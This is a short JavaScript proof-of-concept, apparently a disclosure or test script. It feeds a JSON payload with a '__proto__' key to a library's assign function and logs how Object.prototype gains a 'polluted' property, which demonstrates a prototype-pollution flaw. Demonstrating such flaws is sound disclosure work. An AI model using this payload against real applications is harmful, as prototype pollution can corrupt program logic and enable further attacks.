var Assigner = require( '../lib/assign' )
var assigner = new Assigner()

const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}')
console.log('>>>>>', payload)
var obj = {}

console.log("Before : " + {}.polluted)
assigner.assign(obj, payload)
console.log("After : " + {}.polluted)
